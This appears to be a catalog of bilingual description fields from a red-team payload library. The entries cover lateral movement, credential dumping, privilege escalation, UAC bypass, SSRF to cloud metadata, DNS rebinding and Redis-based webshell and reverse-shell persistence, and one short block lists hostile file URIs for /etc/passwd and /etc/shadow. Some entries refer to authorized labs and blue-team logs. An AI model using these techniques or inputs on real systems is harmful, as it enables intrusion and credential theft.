description.zh: 用 winrs 拉起远程 cmd；获得命令输出通道即确认交互式远程控制可用。
description.en: Spawn a remote cmd via winrs; a working command-output channel confirms interactive remote control.

description.zh: 用 Mimikatz 提取 LSA Secrets；输出服务账号与明文或哈希密文即提取成功。
description.en: Extract LSA Secrets with Mimikatz; printed service accounts with plaintext or hash material means extraction succeeded.

description.en: Submit each select sensitive-field variant to the query endpoint; responses returning passwords, tokens, or similar private fields confirm unconstrained query shapes.

description.zh: 逐条探测 RMI 端口段；任一端口返回 RMI 挑战或握手响应，即确认 RMI 服务暴露。
description.en: Probe each RMI port; any port answering with RMI challenge or handshake responses confirms exposed RMI services.

description.zh: 提交反斜杠分隔的目标；任一解析器接受并跳转，即确认反斜杠规范化差异可利用。

description.zh: 提交协议相对 // 形式目标；跳转落在外部域，即确认路径前缀校验被绕过。

description.zh: 提交 %23 与 @ 组合的片段混淆目标；服务端校验取片段前内容而浏览器跳到 @ 之后的 host，即确认片段解析差异可利用。

description.zh: 对 wp.getUsersBlogs 以错误口令逐条重试同一用户名；响应持续返回认证错误且无速率限制或锁定，即确认 XML-RPC 认证重试未受限。

description.zh: 以 sudo -l 列出授权；root NOPASSWD 条目即锁定免密提权命令。

description.zh: 对授权程序逐一验证已知逃逸；获得 root shell 即确认对应 sudo 提权路径。
description.en: Validate known escapes per granted program; a root shell confirms that sudo escalation path.

description.zh: 查找全盘 SUID 文件；输出 root 属主的非常规 SUID 程序清单即锁定提权候选。
description.en: Find SUID files disk-wide; the printed list of unusual root-owned SUID programs pins escalation candidates.

description.zh: 对候选程序逐一验证已知利用；拿到 root shell 即确认对应 SUID 提权路径。
description.en: Validate known techniques per candidate; obtaining a root shell confirms that SUID escalation path.

description.zh: 写入 ms-settings 劫持键并运行 fodhelper；绑定命令以高完整性级别执行即确认 UAC 自动提升绕过。
description.en: Write the ms-settings hijack keys and run fodhelper; the bound command executing at high integrity confirms the UAC auto-elevate bypass.

description.zh: 写入 mscfile 劫持键并运行 eventvwr；绑定命令以高完整性级别执行即确认该绕过路径。
description.en: Write the mscfile hijack key and run eventvwr; the bound command executing at high integrity confirms this bypass path.

description.zh: 用 UACME 执行指定绕过方法；目标进程以管理员令牌运行即确认对应方法有效。
description.en: Run the selected UACME method; the target process running with an admin token confirms the method works.

description.zh: 用 vaultcmd /list 列出 Vault；输出各 Vault 家族即枚举完成。
description.en: List vaults with vaultcmd /list; the printed vault families complete enumeration.

description.zh: 列出 Windows Credentials Vault 条目；输出凭据资源与身份条目即确认存在可提取项。
description.en: List the Windows Credentials vault entries; printed credential resources and identities confirm extractable items.

description.zh: 用 sekurlsa::credman 从内存提取凭据管理器密钥；输出用户名与口令即确认内存凭据可读。
description.en: Extract credential-manager secrets from memory with sekurlsa::credman; printed usernames and passwords confirm readable in-memory credentials.

description.zh: 列出 WLAN 配置文件；输出接口下全部配置文件名即枚举完成。

description.en: Show the profile passphrase with key=clear; plaintext key material in the output confirms local extraction.

description.zh: 逐条将回环 URL 提交到 SSRF 注入点并对比响应；任一地址返回与基线不同的内容、状态码或耗时，即确认 SSRF 可达本机服务。
description.en: Submit each loopback URL to the SSRF injection point and compare responses; any address returning content, status, or timing different from the baseline confirms SSRF reaches local services.

description.zh: 逐条探测回环常用端口并记录响应差异；某端口返回非超时响应（banner 或状态差异）即确认对应服务在目标侧监听。
description.en: Probe common loopback ports one by one and record response differences; a non-timeout response (banner or status change) confirms the corresponding service listens on the target side.

description.zh: 逐条探测内网管理台地址并对比响应；返回管理台登录页或特征内容即确认可触达对应内网面板。
description.en: Probe internal admin-console addresses one by one; a returned login page or signature content confirms the corresponding internal panel is reachable.

description.zh: 逐条提交 file URI 并观察响应差异；返回 passwd、win.ini 或 environ 内容即确认 file scheme 未被过滤且可读本地文件。
description.en: Submit each file URI and observe response differences; returned passwd, win.ini, or environ content confirms the file scheme is unfiltered and local files are readable.

description.zh: 逐条提交整数、八进制、十六进制与通配 DNS 回环变体并对比拦截情况；过滤拦截 127.0.0.1 而某变体仍返回回环内容，即确认地址规范化缺口。
description.en: Submit integer, octal, hex, and wildcard-DNS loopback variants and compare filtering; a variant returning loopback content while 127.0.0.1 is blocked confirms an address-canonicalization gap.

description.zh: 逐条提交解析器差异 URL 并对比请求落点；带外域名收到回连或返回解析歧义内容，即确认 URL 解析差异可绕过过滤。
description.en: Submit parser-differential URLs and compare where requests land; an out-of-band hit or differential content confirms URL parsing ambiguity bypasses the filter.

description.zh: 逐条提交通配 DNS 域名并观察解析与响应；域名解析到 127.0.0.1 且返回回环内容，即确认主机名白名单可被通配 DNS 绕过。
description.en: Submit wildcard-DNS names and observe resolution and responses; a name resolving to 127.0.0.1 with returned content confirms the hostname allowlist can be bypassed via wildcard DNS.

description.zh: 逐条经 SSRF 注入点访问 AWS IMDS 路径；返回元数据目录或字段（如 instance-id）即确认 IMDS 可达。
description.en: Access AWS IMDS paths through the SSRF injection point; a returned metadata directory or fields (such as instance-id) confirm IMDS reachability.

description.zh: 枚举已附加角色名后读取指定角色的临时凭证；返回含 AccessKeyId 与 SecretAccessKey 的 JSON 即确认角色凭证可被窃取。
description.en: Enumerate attached role names and read temporary credentials for the chosen role; JSON containing AccessKeyId and SecretAccessKey confirms role credentials can be stolen.

description.zh: 读取 user-data 启动脚本；返回明文启动脚本即确认实例自定义数据可被读取，注意其中可能包含密钥。
description.en: Read user-data startup scripts; plaintext returned confirms instance custom data is readable and may contain secrets.

description.zh: 逐条提交 file URI；返回对应文件内容即确认 file scheme 未被过滤。

description.en: Submit the gopher Redis sequence; a complete RESP frame in listener or Redis logs confirms gopher can craft arbitrary TCP payloads.

description.zh: 向目标主机与端口发送 dict 探测命令；捕获器收到探测命令行即确认 dict scheme 端口边界。
description.en: Send the dict probe command to the target host and port; the capture service receiving the command line confirms the dict-scheme port boundary.

description.zh: 对回环 6379 发送 info 与 keys 命令；返回 Redis 信息或键列表即确认 dict 可与 Redis 交互。
description.en: Send info and keys to loopback 6379; a returned Redis info block or key list confirms dict interaction with Redis.

description.zh: 对回环 11211 发送 stats 与 get 命令；返回统计文本或键值即确认 Memcached 可经 dict 探测。
description.en: Send stats and get to loopback 11211; returned stats text or key values confirms Memcached probing via dict.

description.zh: 按序执行 set、config、save 序列；Web 根目录出现 shell.php 且可被解析，即确认 dict 可写入 WebShell。
description.en: Execute the set, config, and save sequence in order; shell.php appearing in the web root and parsing confirms WebShell writing via dict.

description.zh: 提交百分号编码的命令变体；捕获器解码后收到 set 命令，即确认编码绕过单层过滤。
description.en: Submit the percent-encoded command variant; a decoded set command on the capture service confirms encoding bypasses single-pass filtering.

file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/resolv.conf

description.zh: 逐条读取 Linux 敏感文件；返回对应文件内容即确认 file scheme 可读且路径未被过滤。
description.en: Read each sensitive Linux file; returned content confirms the file scheme is readable and paths are unfiltered.

description.zh: 逐条读取 Windows 敏感文件；返回 win.ini、SAM 或私钥内容即确认 Windows 路径可读。
description.en: Read each sensitive Windows file; returned win.ini, SAM, or key content confirms Windows paths are readable.

description.zh: 逐条读取 Web 应用配置；返回数据库连接串或应用密钥即确认配置文件可被窃取。
description.en: Read each web-application configuration file; returned connection strings or application secrets confirm configuration theft.

description.zh: 逐条读取云环境凭据文件；返回 serviceaccount token 或 AWS credentials 即确认云凭据可被窃取。
description.en: Read each cloud-credential file; a returned serviceaccount token or AWS credentials file confirms cloud-credential theft.

description.zh: 逐条读取 SSH 私钥路径；返回 OPENSSH PRIVATE KEY 内容即确认私钥可被窃取。
description.en: Read each SSH private-key path; returned OPENSSH PRIVATE KEY content confirms private-key theft.

description.zh: 以大小写混合提交 file scheme 与路径；混合大小写仍返回内容而标准形式被拦，即确认大小写校验缺口。
description.en: Submit the file scheme and paths in mixed case; mixed-case content while the canonical form is blocked confirms a case-check gap.

description.zh: 逐条提交八进制、整数、十六进制与通配 DNS 回环变体并对比拦截；过滤拦截 127.0.0.1 而某变体返回回环内容，即确认地址规范化缺口。
description.en: Submit octal, integer, hex, and wildcard-DNS loopback variants; a variant returning loopback content while 127.0.0.1 is blocked confirms an address-canonicalization gap.

description.zh: 提交解析器差异 URL 并对比请求落点；带外域名收到回连或返回歧义内容，即确认解析歧义绕过过滤。
description.en: Submit parser-differential URLs and compare request destinations; an out-of-band hit or ambiguous content confirms parsing ambiguity bypasses the filter.

description.zh: 经开放重定向跳转到回环地址；取回器跟随跳转并返回 127.0.0.1 内容，即确认重定向链绕过成立。
description.en: Chain an open redirect to a loopback address; the fetcher following the redirect and returning 127.0.0.1 content confirms redirect-chain bypass.

description.zh: 提交 sslip.io 与 nip.io 回环域名；解析到回环且返回内容，即确认主机名白名单可被通配 DNS 绕过。
description.en: Submit sslip.io and nip.io loopback names; resolution to loopback with returned content confirms wildcard-DNS bypass of hostname allowlists.

description.zh: 逐条提交 IPv6 回环变体；任一形式返回回环内容而标准 127.0.0.1 被拦，即确认 IPv6 过滤缺口。
description.en: Submit each IPv6 loopback variant; a form returning loopback content while 127.0.0.1 is blocked confirms an IPv6 filtering gap.

description.zh: 提交百分号编码、空字节与 CRLF 变体；某变体使解析器拆分出回环目标或注入 Host 头，即确认编码与 CRLF 缺口。
description.en: Submit percent-encoding, null-byte, and CRLF variants; a variant splitting the parser toward a loopback target or injecting a Host header confirms encoding and CRLF gaps.

description.zh: 提交混合进制 IP 变体；任一形式解析为 127.0.0.1 且被取回，即确认进制规范化缺口。
description.en: Submit mixed-radix IP variants; any form resolving to 127.0.0.1 and fetched confirms a radix-normalization gap.

description.zh: 用重绑定域名发起 SSRF 并记录两次解析结果；首次返回合法地址、二次返回内网地址且取回成功，即确认存在 DNS 重解析窗口。
description.en: Launch SSRF via the rebinding domain and record both resolutions; a legitimate first resolution followed by an intranet address on the second with a successful fetch confirms a DNS re-resolution window.

description.zh: 逐条提交公共重绑定与通配域名；任一域名先解析公网、后解析回环并返回内容，即确认 TOCTOU 缺口。
description.en: Submit each public rebinding and wildcard domain; one resolving public first then loopback with returned content confirms a TOCTOU gap.

description.zh: 运行交替解析器并用其域名发起 SSRF；解析日志显示奇偶交替返回 1.2.3.4 与 127.0.0.1，即确认重绑定行为可复现。
description.en: Run the alternating resolver and launch SSRF via its domain; logs alternating between 1.2.3.4 and 127.0.0.1 confirm reproducible rebinding.

description.zh: 按步骤固定 DNS 与网络环境后复测；两次解析结果不一致且第二次连接内网成功，即确认服务端未固定解析结果。
description.en: Retest after pinning DNS and the network environment; differing resolutions with a successful second intranet connection confirm the server does not pin resolution results.

description.zh: 连续查询同一 A 记录并记录返回；两次查询返回不同地址即确认低 TTL 交替生效。
description.en: Query the same A record repeatedly; differing answers across queries confirm the low-TTL alternation.

description.zh: 对回环 6379 发送 dict info 与 gopher PING；返回 Redis 信息或 +PONG 即确认 Redis 可达。
description.en: Send dict info and a gopher PING to loopback 6379; returned Redis info or +PONG confirms Redis reachability.

description.zh: 按序执行 set、config、save 序列写入 WebShell；Web 根出现 shell.php 且可解析即确认持久化成功。
description.en: Execute the set, config, and save sequence to write a WebShell; shell.php appearing in the web root and parsing confirms persistence.

description.zh: 写入 SSH 公钥到 authorized_keys；使用对应私钥可登录目标 root 账户即确认公钥持久化成功。
description.en: Write the SSH public key into authorized_keys; logging in to the target root account with the matching private key confirms key persistence.

description.zh: 写入 cron 反弹任务；反弹连接到达监听地址与端口即确认 cron 持久化成功。
description.en: Write the cron reverse task; a reverse connection arriving on the listener address and port confirms cron persistence.

description.zh: 运行 rogue server 加载 Redis 模块；Redis 日志出现 MODULE LOAD 且主从同步完成，即确认 rogue 加载链路可用。
description.en: Run the rogue server to load a Redis module; MODULE LOAD in Redis logs with completed replication confirms the rogue-load path.

description.zh: 提交 RESP PING 帧；返回 +PONG 即确认 gopher 到 Redis 的单命令链路。
description.en: Submit the RESP PING frame; a +PONG reply confirms the single-command gopher-to-Redis path.

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_PSEXEC_E_1 与蓝队日志；成功时获得目标交互式 shell 且 whoami 显示实验用户上下文，蓝队可见 7045 服务创建事件。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_PSEXEC_E_1 with blue-team logs; an interactive shell on the target with whoami showing the lab user context, plus event 7045 service creation, confirms success.

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_PSEXEC_E_2 与蓝队日志；成功时以 NTLM 哈希通过认证并打开目标 shell，安全日志出现 4624 NTLM 登录。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_PSEXEC_E_2 with blue-team logs; authenticating with the NTLM hash and opening a target shell, with event 4624 NTLM logon, confirms success.

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_PSEXEC_E_3 与蓝队日志；成功时远程执行 whoami 并返回目标主机名与用户名输出。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_PSEXEC_E_3 with blue-team logs; remote whoami returning the target hostname and username confirms success.

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_PSEXEC_E_4 与蓝队日志；成功时 PsExec 连接目标返回 cmd 交互界面，且临时服务创建后被清理。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_PSEXEC_E_4 with blue-team logs; PsExec returning a cmd session on the target with the temporary service created and cleaned up confirms success.

description.zh: PowerShell PPID 欺骗：托管 API System.Diagnostics.ProcessStartInfo 没有 ParentProcessId 属性，不能直接赋值；真实实现路径是先 InitializeProcThreadAttributeList/UpdateProcThreadAttribute 在 STARTUPINFOEX 上设置 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS，再以 EXTENDED_STARTUPINFO_PRESENT 调用 CreateProcess。；成功时新创建的 cmd.exe 父进程显示为 explorer。
description.en: PowerShell PPID spoofing: the managed System.Diagnostics.ProcessStartInfo has no ParentProcessId property and cannot be assigned; the real implementation sets PROC_THREAD_ATTRIBUTE_PARENT_PROCESS on a STARTUPINFOEX via InitializeProcThreadAttributeList and UpdateProcThreadAttribute, then calls CreateProcess with EXTENDED_STARTUPINFO_PRESENT.; the newly created cmd.exe showing explorer as its parent process confirms success.

description.zh: 逐条编译包含远程资源引用的 LaTeX 并记录编译日志；成功时带外域名收到取回请求或编译日志显示远程包含成功。
description.en: Compile each LaTeX sample referencing remote resources and record compile logs; an out-of-band fetch hit or the compile log showing the remote inclusion confirms success.

description.zh: 逐条请求回环端口并记录响应与日志差异；成功时开放端口返回非超时响应，据此区分服务存活与关闭。
description.en: Request each loopback port and record response and log differences; open ports returning non-timeout responses distinguishes live services from closed ones.

description.zh: 逐条提交非规范回环表示并记录响应与日志差异；成功时某变体解析为 127.0.0.1 且被取回，而标准形式被过滤，即确认解析差异。
description.en: Submit each non-canonical loopback representation and record response and log differences; a variant resolving to 127.0.0.1 and fetched while the canonical form is blocked confirms the parsing difference.

description.zh: 逐条请求私网网关与服务端口并记录响应与日志差异；成功时存活主机或端口返回非超时响应，形成内网可达性地图。
description.en: Request each private gateway and service port and record response and log differences; live hosts or ports returning non-timeout responses builds the intranet reachability map.

description.zh: 逐条请求多云元数据端点并记录响应与日志差异；成功时任一平台端点返回元数据字段，即确认实例元数据可被 SSRF 读取。
description.en: Request each multi-cloud metadata endpoint and record response and log differences; any platform endpoint returning metadata fields confirms instance metadata readable via SSRF.
